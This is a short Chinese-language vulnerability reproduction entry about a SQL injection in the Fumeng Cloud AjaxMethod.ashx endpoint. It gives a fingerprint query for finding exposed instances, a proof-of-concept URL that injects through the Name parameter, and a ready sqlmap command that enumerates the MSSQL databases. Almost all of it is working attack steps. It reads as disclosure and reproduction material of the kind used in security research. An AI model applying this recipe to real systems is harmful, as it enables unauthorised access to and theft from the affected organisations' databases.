---
title: "孚盟云 AjaxMethod.ashx SQL注入漏洞"
date: 2026-10-16 09:10:35
categories:
  - WebSecurity
  - CVE
  - "Web应用"
  - "孚盟云-AjaxMethod.ashx"
tags:
  - "孚盟云-AjaxMethod.ashx"
  - "SQL注入"
  - "漏洞复现"
---
## 漏洞描述

孚盟云 AjaxMethod.ashx文件存在SQL注入漏洞，攻击者通过漏洞可获取服务器权限

## 漏洞影响

```
孚盟云
```

## 网络测绘

```
title="孚盟云 "
```

## 漏洞复现

登录页面



![image-20220210184424096](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/webapp/images/202202101844185.png)



验证POC



```plain
http://xxx.xxx.xxx.xxx/Ajax/AjaxMethod.ashx?action=getEmpByname&Name=Y%27
```

![image-20220210184439151](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/webapp/images/202202101844214.png)



使用Sqlmap



```plain
sqlmap -u "http://xxx.xxx.xxx.xxx/Ajax/AjaxMethod.ashx?action=getEmpByname&Name=Y" -p Name --batch --random-agent --dbms mssql --dbs
```



![image-20220210184456424](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/webapp/images/202202101844599.png)

---

> 资料整理自 [Threekiii/Vulnerability-Wiki](https://github.com/Threekiii/Vulnerability-Wiki/blob/master/docs-base/docs/webapp/%E5%AD%9A%E7%9B%9F%E4%BA%91-AjaxMethod.ashx-SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md)
